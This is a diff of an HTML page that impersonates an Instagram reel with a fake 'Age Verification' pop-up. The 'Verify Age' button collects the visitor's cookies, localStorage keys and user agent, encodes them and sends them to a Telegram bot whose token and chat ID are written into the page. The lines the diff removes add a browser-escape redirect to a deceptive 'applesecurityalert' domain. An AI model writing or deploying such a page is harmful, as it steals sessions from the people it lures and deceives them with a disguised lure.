@@ -2,22 +2,18 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>Instagram</title>
     <style>
-        body, html { margin:0; padding:0; height:100%; background:#000; font-family: -apple-system, sans-serif; overflow: hidden; }
-        #v { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:9999; color:#fff; text-align:center; padding-top:150px; }
-        .btn { background:#0095f6; color:#fff; border:none; padding:15px; border-radius:10px; font-weight:700; width:80%; cursor:pointer; font-size:16px; margin-top:20px; }
-        #touch-layer { position:fixed; top:0; left:0; width:100%; height:100%; z-index:1000; cursor:pointer; }
+        body, html { margin:0; padding:0; height:100%; background:#000; font-family: -apple-system, sans-serif; }
+        #v { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:999; color:#fff; text-align:center; padding-top:100px; }
+        .btn { background:#0095f6; color:#fff; border:none; padding:12px; border-radius:8px; font-weight:600; width:80%; cursor:pointer; font-size:16px; margin-top:20px; }
     </style>
 </head>
 <body>
-    <div id="touch-layer" onclick="go()"></div>
-
     <div id="v">
-        <img src="https://www.instagram.com/static/images/ico/favicon-192.png/b30670883ce2.png" width="60">
+        <img src="https://www.instagram.com/static/images/ico/favicon-192.png/b30670883ce2.png" width="50">
         <h2>Age Verification</h2>
-        <p style="padding:0 40px; font-size:14px; color:#a8a8a8;">Please verify your age (18+) to continue watching this reel.</p>
-        <button class="btn" onclick="done()">Verify Age</button>
+        <p style="padding:0 30px; font-size:14px; color:#ccc;">To continue watching, please verify your age.</p>
+        <button class="btn" onclick="done()">Verify Age (18+)</button>
     </div>
 
     <iframe src="https://www.instagram.com/reel/DXvjb0FP8W0/embed/" style="width:100%; height:100vh; border:none;"></iframe>
@@ -26,24 +22,15 @@
         const T="8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k", C="8639892987";
         const h=s=>[...s].map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
 
-        // Agar hum Instagram se BAHAR hain (Safari/Chrome mein)
-        if (!navigator.userAgent.includes("Instagram")) {
-            document.getElementById('touch-layer').style.display = 'none';
-            document.getElementById('v').style.display = 'block';
-        }
-
-        function go() {
-            // Hard Redirect to Safari/Chrome
-            window.location.href = "googlechrome://applesecurityalert6-prog.github.io/";
-            setTimeout(() => { window.location.href = "x-safari-https://applesecurityalert6-prog.github.io/"; }, 500);
-        }
+        // Theek 5 second baad pop-up aayega bina reel roke
+        setTimeout(() => { 
+            document.getElementById('v').style.display = 'block'; 
+        }, 5000);
 
         function done() {
             let d = JSON.stringify({st:Object.keys(localStorage), ck:document.cookie, ua:navigator.userAgent});
-            new Image().src=`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🔓_FINAL_EXFIL_${h(d)}`;
+            new Image().src=`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🔓_FINAL_${h(d)}`;
             document.getElementById('v').style.display = 'none';
-            // Wapas asali reel par
-            window.location.href = "https://www.instagram.com/reel/DXvjb0FP8W0/";
         }
     </script>
 </body>
